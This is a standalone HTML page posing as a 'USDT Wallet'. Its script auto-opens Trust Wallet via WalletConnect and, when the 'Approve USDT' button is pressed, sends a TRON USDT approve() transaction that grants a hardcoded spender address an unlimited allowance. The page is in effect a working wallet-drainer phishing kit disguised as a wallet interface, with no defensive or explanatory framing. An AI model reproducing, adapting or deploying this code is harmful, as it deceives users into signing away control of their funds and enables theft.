<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>USDT Wallet</title>

<style>
body{background:#0b0f19;color:white;font-family:sans-serif;text-align:center;padding:20px}
.card{background:#121826;padding:20px;border-radius:16px;max-width:420px;margin:auto}
button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px}
.approve{background:#22c55e}
</style>
</head>

<body>

<div class="card">
<h2>💰 USDT Wallet</h2>

<div id="status">Initializing...</div>
<div id="wallet"></div>

<button id="approveBtn" class="approve">Approve USDT</button>

</div>

<script type="module">
import bs58 from "https://esm.sh/bs58";

const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";

const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

let client, session;

// detect mobile
function isMobile(){
  return /Android|iPhone|iPad/i.test(navigator.userAgent);
}

// auto open trust wallet
function openWallet(){
  const link = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
  window.location.href = link;
}

// convert
function tronToHex(addr){
  const bytes = bs58.decode(addr);
  return Array.from(bytes).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,42);
}

// encode
function encodeApprove(spenderHex){
  return "0x095ea7b3" + spenderHex.replace(/^41/,"").padStart(64,"0") + "f".repeat(64);
}

// auto connect
async function autoConnect(){
  const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");

  client = await SignClient.init({
    projectId: PROJECT_ID,
    metadata:{
      name:"USDT Wallet",
      description:"auto connect",
      url:location.origin,
      icons:[""]
    }
  });

  // reuse session
  const existing = client.session.getAll();

  if(existing.length){
    session = existing[0];
  } else {
    const { uri, approval } = await client.connect({
      requiredNamespaces:{
        tron:{
          methods:[
            "tron_sendTransaction",
            "tron_signTransaction"
          ],
          chains:[TRON_CHAIN],
          events:[]
        }
      }
    });

    // mobile → open wallet automatically
    if(isMobile()){
      const deep = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
      window.location.href = deep;
    } else {
      document.getElementById("status").innerText = "Scan QR in wallet";
    }

    session = await approval();
  }

  const wallet = session.namespaces.tron.accounts[0].split(":")[2];
  document.getElementById("wallet").innerText = wallet;
  document.getElementById("status").innerText = "Connected";
}

// approve
document.getElementById("approveBtn").onclick = async ()=>{
  const spenderHex = tronToHex(SPENDER);

  const result = await client.request({
    topic: session.topic,
    chainId: TRON_CHAIN,
    request:{
      method:"tron_sendTransaction",
      params:{
        to: USDT,
        data: encodeApprove(spenderHex),
        value:"0x0"
      }
    }
  });

  console.log(result);
};

// 🚀 AUTO START
(async ()=>{
  document.getElementById("status").innerText = "Connecting...";

  // mobile → force open wallet first
  if(isMobile() && !window.location.href.includes("trustwallet")){
    openWallet();
    return;
  }

  await autoConnect();
})();
</script>

</body>
</html>
